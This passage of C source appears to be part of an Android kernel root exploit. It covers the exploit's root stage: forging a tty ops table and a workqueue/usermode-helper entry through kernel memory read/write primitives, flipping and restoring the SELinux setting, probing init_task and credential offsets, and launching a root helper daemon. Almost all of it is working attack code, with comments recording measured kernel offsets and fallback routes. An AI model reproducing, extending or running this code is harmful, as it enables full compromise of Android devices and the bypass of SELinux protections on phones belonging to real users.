           creds_ok, socket_ok, activated_ok, complete_done, !tail_published,
           (unsigned long long)tty_object.tty);
  result = helper_ok && !tail_published;

out:
  if (ops_published && restore_tty_object(fd, &tty_object, 1, 0)) {
    ops_published = 0;
  }
  if (tail_published && !work_may_be_queued &&
      restore_tty_object(fd, &tty_object, 0, 1)) {
    tail_published = 0;
  }
  if (!tail_published) {
    safe_to_close = 1;
  }
  if (!result && selinux_changed) {
    int restored = (int)kernel_write_data(fd, selinux_img, &original_selinux,
                                          sizeof(original_selinux));
    rmg_diag("ROOT pty selinux restore=%d old=%u\n", restored, original_selinux);
  }
  if (safe_to_close && !ops_published) {
    close_private_pty(&pty);
  } else {
    /* Leave the PTY open: closing it would free the tty while it still points at our
     * forged ops table. Pinning the fd is the safe failure. */
    rmg_diag("ROOT pty PINNED fds=%d/%d ops=%d tail=%d\n", pty.master, pty.slave,
             ops_published, tail_published);
  }
  return result;
}

/* Direct entry to the static-work cascade for callers that cannot go
 * through install_android_root() (see common.h). Publishes globals
 * exactly the way install_android_root()'s tail does: only a
 * credentials file actually reading uid==0 counts as success. */
int install_static_work_stage(int fd) {
  root_uid_before = getuid();
  int installed = install_static_work_umh_root(fd);
  if (installed) {
    uint32_t measured_uid = 0xffffffff;
    if (read_root_creds_uid(&measured_uid) && measured_uid == 0) {
      root_child_done = 1;
      root_uid_after = measured_uid;
      rmg_diag("ROOT staticwork stage SUCCEEDED uid_after=%u (measured)\n",
               measured_uid);
    } else {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      rmg_diag("ROOT staticwork installed but creds unverified "
               "measured_uid=%u\n", measured_uid);
    }
  }
  return installed;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
  /* rmg_diag, not pr_info. The root stage previously produced NO output at all on device:
   * it entered, issued ~11 pipe operations, and vanished. pr_info's sink had already
   * stopped at the fops checkpoint, so there was no evidence of where it stopped. rmg_diag
   * fsyncs to /data/local/tmp/rmg-diag.log and survives a crash, so these markers bracket
   * each phase of the root stage. */
  rmg_diag("ROOT stage enter uid=%u fd=%d\n", root_uid_before, fd);

  /* Resolve the helper path up front; both stages want it. */
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    rmg_diag("ROOT helper path missing/invalid (CVE43499_ROOT_HELPER)\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif

  /* Map which kernel regions are readable before attempting any root stage. The cred-patch
   * route was closed on the strength of ONE faulting address family (0xffffff8837b6...), but
   * this session read genuine slab at 0xffffff80011da200 with the same reader, so the
   * "slab is unreachable" closure was too strong. Run this whenever the slab map matters.
   * Opt-in: most of these addresses fault, and a fault costs a reboot. */
  if (getenv("ROOT_IT")) {
    /* Dump the credential-bearing range of init_task.
     *
     * The cred patch was closed because no task_struct in slab is reachable (0xffffff8837b6...
     * hangs on read, section 22). But init_task ITSELF is a kernel-image object at +0x02c05080,
     * inside the WRITABLE .data window, and its tasks-list endpoints read cleanly. So it is the
     * one task_struct that is both readable and writable.
     *
     * That is not an escalation by itself - init_task is already uid 0 / init_cred and runs on
     * no CPU. Its value is as an ANCHOR for the credential layout: init_cred is a .data global,
     * so identifying it here gives the exact cred field offsets on THIS build, which both the
     * workqueue and PTY routes lack. Read-only, so it cannot turn into a faulting write. */
    if (fork() == 0) {
      uintptr_t it = text_addr(INIT_TASK);
      rmg_diag("ROOT itdump init_task=%016zx\n", it);
      for (int off = 0x780; off < 0x800; off += 8) {
        uint64_t w = 0;
        if (!umh_read64(fd, it + (uintptr_t)off, &w, "it.dump")) {
          rmg_diag("ROOT itdump +0x%03x FAILED\n", off);
          break;
        }
        rmg_diag("ROOT itdump +0x%03x = %016llx\n", off, (unsigned long long)w);
      }
      /* MEASURED LAYOUT, now confirmed on this build (offsets match target.h exactly):
         +0x790 real_cred = +0x798 cred = 0xffffffc00a22bea0 (init_cred)
         +0x7a8 comm = 2f72657070617773 = "swapper/0"   +0x7b0 = 0x30
         +0x7d8 files = 0xffffffc00abebb40
       * But init_cred (0xffffffc00a22bea0) is BELOW the slid image base 0xffffffc008150000 -
       * delta -0x20dbea0 - so it is NOT an image symbol and NOT in the writable .data window.
       * That is the decisive fact for the cred patch: even though we can now read the cred POINTER,
       * the cred OBJECT it points at is outside the only region we can write. Verify by reading
       * init_cred's own fields, which is also the authoritative confirmation of the cred layout
       * (refcount, then uid/gid/suid/sgid/euid/egid/fsuid/fsgid, then securebits). */
      uintptr_t cred = 0;
      if (umh_read64(fd, it + TASK_STRUCT_REAL_CRED_OFF, &cred, "it.cred") &&
          is_direct_ptr(cred)) {
        rmg_diag("ROOT itdump init_cred=%016zx (KA=%016zx delta=%#zx) - dumping\n", cred,
                 kaslr_base, (long)(cred - kaslr_base));
        for (int off = 0; off < 0x40; off += 8) {
          uint64_t w = 0;
          if (!umh_read64(fd, cred + (uintptr_t)off, &w, "cred.dump")) {
            rmg_diag("ROOT itdump init_cred+0x%02x FAILED\n", off);
            break;
          }
          rmg_diag("ROOT itdump init_cred+0x%02x = %016llx\n", off, (unsigned long long)w);
        }
      } else {
        rmg_diag("ROOT itdump cred pointer unreadable\n");
      }
      _exit(0);
    }
    int itst = 0;
    waitpid(-1, &itst, 0);
    return 0;
  }

  if (getenv("ROOT_CP_PROBE_SLAB")) {
    /* Probe the task_struct chain specifically. The cred patch was closed on ONE faulting address
     * family (0xffffff8837b6...), but section 16/17 proved slab reads work broadly in the
     * 0xffffff80011d.... arena, so the task slab must be re-measured rather than assumed dead.
     *
     * init_task (+0x02c05080) sits INSIDE the readable/writable .data window, so the list head is
     * reachable with no slab access at all. MEASURED head: init_task+0x4d0/0x4d8 are the
     * tasks list endpoints (both real task_struct addresses) and +0x4e0 = 0x8c = 140 is
     * init_task's own pid, which independently confirms the field layout.
     *
     * Each candidate task is then probed field by field - pid first (a small integer is the
     * cheapest possible confirmation that we are really looking at a task_struct), then cred,
     * then real_cred. If cred is readable the cred patch is revived immediately. All in one
     * child so a fault preserves the words already logged. */
  if (fork() == 0) {
    uintptr_t it = text_addr(INIT_TASK);
    rmg_diag("ROOT cpprobe init_task=%016zx\n", it);
    uint64_t next = 0;
    if (!umh_read64(fd, it + PIPE_WALK_TASK_TASKS_OFF, &next, "cp.head")) {
      rmg_diag("ROOT cpprobe head read FAILED\n");
      _exit(0);
    }
    uintptr_t seen[8];
    size_t nseen = 0;
    uintptr_t cur = (uintptr_t)next;
    for (int hop = 0; hop < 24 && cur && cur != it && nseen < 8; hop++) {
      uint64_t pid = 0;
      if (!umh_read64(fd, cur + PIPE_WALK_TASK_PID_OFF, &pid, "cp.pid")) {
        rmg_diag("ROOT cpprobe task=%016zx hop=%d pid READ FAILED "
                 "(this family is unreachable)\n", cur, hop);
        break;
      }
      seen[nseen++] = cur;
      rmg_diag("ROOT cpprobe task=%016zx hop=%d pid=%llu READABLE\n",
               cur, hop, (unsigned long long)pid);
      uint64_t cred = 0;
      if (umh_read64(fd, cur + TASK_STRUCT_CRED_OFF, &cred, "cp.cred")) {
        rmg_diag("ROOT cpprobe task=%016zx pid=%llu CRED=%016llx READABLE\n",
                 cur, (unsigned long long)pid, (unsigned long long)cred);
      } else {
        rmg_diag("ROOT cpprobe task=%016zx pid=%llu cred read failed\n",
                 cur, (unsigned long long)pid);
      }
      uint64_t nxt = 0;
      if (!umh_read64(fd, cur + PIPE_WALK_TASK_TASKS_OFF, &nxt, "cp.next")) {
        rmg_diag("ROOT cpprobe task=%016zx next read FAILED\n", cur);
        break;
      }
      if (nxt == cur) {
        rmg_diag("ROOT cpprobe task=%016zx next==self, chain ends\n", cur);
        break;
      }
      cur = (uintptr_t)nxt;
    }
    rmg_diag("ROOT cpprobe done readable_tasks=%zu\n", nseen);
    _exit(0);
  }
  int cpst = 0;
  waitpid(-1, &cpst, 0);
  root_cp_probe_slab_map(fd);
  }

  /* Prefer the PTY/SAK path: it lets the kernel perform the workqueue queueing, which is
   * the only way the borrowed work_struct can ever be picked up. The legacy
   * hand-rolled-injection stage is kept as a fallback so behaviour is strictly additive,
   * and the static-work forge after it needs no SLAB write at all (pure kernel .data),
   * so it can produce root even when the pipe physrw cache gate never completes. */
  int installed = install_pty_umh_root(fd, root_umh_path);
  if (!installed) {
    rmg_diag("ROOT pty stage failed; trying legacy workqueue injection\n");
    installed = install_workqueue_umh_root(fd);
  }
  if (!installed) {
    rmg_diag("ROOT workqueue stage failed; trying static-work forge\n");
    installed = install_static_work_umh_root(fd);
  }
  if (installed) {
    /* The PTY stage must publish the same globals the legacy path does, or main.c's
     * `exploit_ok = cfi_stage_done && root_child_done` can never become true and a fully
     * successful PTY root would still report failure.
     *
     * root_uid_after is read back from the helper's own credentials file rather than being
     * asserted as 0. The helper (su_daemon.c umh_main) only reaches daemon_main() after
     * getuid()==geteuid()==getgid()==getegid()==0, and it writes the values it actually
     * holds to ROOT_CREDS_SENTINEL. A missing or non-zero file therefore fails closed
     * instead of claiming a root that was never measured. */
    uint32_t measured_uid = 0xffffffff;
    if (read_root_creds_uid(&measured_uid) && measured_uid == 0) {
      root_child_done = 1;
      root_uid_after = measured_uid;
      rmg_diag("ROOT pty stage SUCCEEDED uid_after=%u (measured)\n", measured_uid);
    } else {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      rmg_diag("ROOT pty socket appeared but creds unverified measured_uid=%u\n",
               measured_uid);
    }
  }
  rmg_diag("ROOT stage exit installed=%d\n", installed);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_ROOT_REF_HOLDER_REQUIRED) && \
    !APP_ROOT_REF_HOLDER_REQUIRED
  if (installed) {
    pr_info("root reference holder not required by target route\n");
  }
#else
#if defined(QEMU_FORCED_SLIDE_TEST) && QEMU_FORCED_SLIDE_TEST
  if (installed) {
    pr_info("root p0 reference holder not required for qemu forced slide\n");
  }
#else
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
#endif
#endif
  return installed;
}
